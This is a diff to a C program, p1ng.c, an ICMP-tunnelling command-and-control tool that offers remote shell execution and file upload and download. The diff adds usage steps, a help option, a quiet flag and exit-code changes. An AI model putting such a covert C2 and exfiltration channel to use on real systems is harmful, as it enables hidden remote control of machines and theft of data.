@@ -1,4 +1,17 @@
-﻿//只有当ICMPheader内ID匹配且ICMP-DATA域完全一致才能判别两包由关联。
+﻿/**
+ * Copyright (c) 2020-2021 aplyc1a <aplyc1a@protonmail.com>
+ * 
+ * How to use:
+ * step 1: gcc p1ng.c -o p1ng
+ * step 2: echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all  #server part dont need.
+ * step 3: ./p1ng -S -c ${client_addr}
+ * step 4: ./p1ng -C
+ * step 5: Input 'help' in server part.Enjoy.
+ *
+ *
+ **/
+ 
+//只有当ICMPheader内ID匹配且ICMP-DATA域完全一致才能判别两包由关联。
 //echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
 #include <stdio.h>
 #include <string.h>
@@ -37,6 +50,7 @@ struct timeval recvtime;
 uint8_t sendpacket[PACKET_SIZE];
 uint8_t recvpacket[PACKET_SIZE];
 uint8_t sockfd;
+uint8_t debug=1,verbose=1;
 
 /*
 struct st_p1ng{
@@ -66,6 +80,7 @@ void print_usage(){
     printf("[shell    *] : execute linux shell command on the remote device.\n");
     printf("[upload   *] : upload file to the p1ng-server.\n");
     printf("[download *] : download file from the p1ng-server.\n");
+    printf("[help      ] : show these help message.\n");
 }
 
 unsigned short cal_chksum(unsigned short *addr, int len) {
@@ -546,7 +561,7 @@ void upload_requester(uint8_t *cmd, uint16_t seq_num){
         pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);
         recv_doneyet = p1ng_write_file(recvpacket, pkt_size, fp);
     }
-    printf("\033[40;36m[*]\033[0mUpload completed. Local filename: \033[40;36m%s\033[0m\n", filename);
+    printf("\r\033[K\033[40;36m[*]\033[0mUpload completed. Local filename: \033[40;36m%s\033[0m\n", filename);
     fclose(fp);
 }
 
@@ -611,7 +626,7 @@ void download_requester(uint8_t *cmd, uint16_t seq_num){
             strncpy(filename,recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+4,recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+3]);
             filename[recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+3]]='\0';
     }
-    printf("\033[40;36m[*]\033[0mDownload completed. Remote filename: \033[40;36m%s\033[0m\n", filename);
+    printf("\r\033[K\033[40;36m[*]\033[0mDownload completed. Remote filename: \033[40;36m%s\033[0m\n", filename);
 
 }
 
@@ -657,7 +672,7 @@ void p1ng_server(uint8_t *client_ip){
     pid = getpid();
     if(check_target(count)){
         printf("\033[40;31m[-]\033[0mTarget(%s) unreachable!\n", client_ip);
-        exit(0);
+        exit(1);
     }
     print_logo();
     uint8_t p1ngcmd[100];
@@ -716,7 +731,7 @@ void p1ng_client(){
         st_ip = (struct ip *) recvpacket;
         strcpy(ip_src,inet_ntoa(st_ip->ip_src));
         strcpy(ip_dst,inet_ntoa(st_ip->ip_dst));
-        printf("\033[40;34m[@]\033[0m %s --> %s %dbytes\n", ip_src, ip_dst, pkt_size);
+        if(verbose||debug) printf("\033[40;34m[@]\033[0m %s --> %s %dbytes\n", ip_src, ip_dst, pkt_size);
         iphdr_len = st_ip->ip_hl << 2;
         icmptotal_len = pkt_size - iphdr_len;
         if( icmptotal_len < 8){
@@ -752,7 +767,7 @@ int main(int argc, char *argv[]){
     uint8_t client_ip[16]="192.168.199.202";
     uint8_t btn_s=0;
     uint8_t btn_c=1;
-    while((opt=getopt(argc,argv,"SCc:"))!=-1)
+    while((opt=getopt(argc,argv,"SChqc:"))!=-1)
     {
         switch(opt)
         {
@@ -764,14 +779,24 @@ int main(int argc, char *argv[]){
                 btn_c=1;
                 break;
             case 'c':
-                strcpy(client_ip,optarg);break;
+                strcpy(client_ip,optarg);
+				break;
+            case 'h':
+                printf("-C client-mode\n");
+                printf("-S Server-mode\n");
+                printf("-c [IP] configure c2-client address\n");
+                printf("-h show usage\n");
+                exit(0);
+            case 'q':
+                debug=0;
+                verbose=0;
             default:
                 btn_c=1;
         }
     }
     if((btn_s^btn_c)==0){
         printf("\033[40;33m[!]\033[0mCheck your command line argument!\n");
-        exit(0);
+        exit(1);
     }
     if(btn_s){
         p1ng_server(client_ip);
